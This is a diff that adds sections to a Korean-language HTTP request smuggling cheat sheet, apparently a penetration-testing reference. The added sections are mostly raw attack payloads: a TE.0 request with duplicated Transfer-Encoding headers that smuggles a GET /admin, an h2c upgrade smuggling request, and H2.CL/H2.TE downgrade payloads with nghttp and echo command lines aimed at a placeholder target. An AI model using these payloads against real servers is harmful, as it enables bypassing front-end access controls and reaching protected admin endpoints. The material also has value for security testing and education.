@@ -85,6 +85,56 @@ Transfer-Encoding: chunked
 (100 응답 없이 본문 즉시 전송)
 ```
 
+#### TE.0 (2024 신변형 — Google Cloud Load Balancer 등)
+
+```
+POST / HTTP/1.1
+Host: TARGET
+Content-Length: 5
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked-x
+
+0
+
+GET /admin HTTP/1.1
+Host: TARGET
+
+```
+
+프론트가 TE 인식 (chunked → 0 종료) → 백엔드가 TE 무시하면 뒤 GET이 별도 요청.
+
+#### h2c smuggling (HTTP/2 cleartext upgrade)
+
+```
+GET / HTTP/1.1
+Host: TARGET
+Connection: Upgrade, HTTP2-Settings
+Upgrade: h2c
+HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
+
+```
+
+응답이 `101 Switching Protocols`이면 reverse proxy가 raw TCP를 backend에 forwarding → backend가 HTTP/2로 해석 → smuggling 가능.
+
+```bash
+# h2c upgrade + 후속 HTTP/2 frame 직접 전송
+nghttp -v --upgrade "http://target/" 2>&1 | grep -E "101|HTTP/2"
+
+# 후속 HTTP/2 SETTINGS frame + HEADERS로 admin 요청
+# nghttp2 + custom payload (raw frame 전송)
+```
+
+#### HTTP/2 frame 직접 페이로드 (H2.CL / H2.TE downgrade)
+
+```
+# H2.CL: HTTP/2 → HTTP/1.1 변환 시 Content-Length가 frame size보다 작으면 잔존 데이터가 다음 요청
+echo -e "POST / HTTP/2\nHost: TARGET\ncontent-length: 0\n\nGGET /admin HTTP/1.1\nHost: TARGET\n\n" | h2-frame-tool
+
+# H2.TE: HTTP/2 헤더에 Transfer-Encoding: chunked 포함 (RFC 위반이지만 일부 gateway 통과)
+nghttp -v -H "transfer-encoding: chunked" "https://target/"
+# 200이 아닌 400/505 외 응답이면 downgrade 의심
+```
+
 #### Cache deception + smuggling
 ```
 # 정적 확장자 경로 (`/user.js`)로 smuggle된 요청이 캐시되어 재사용
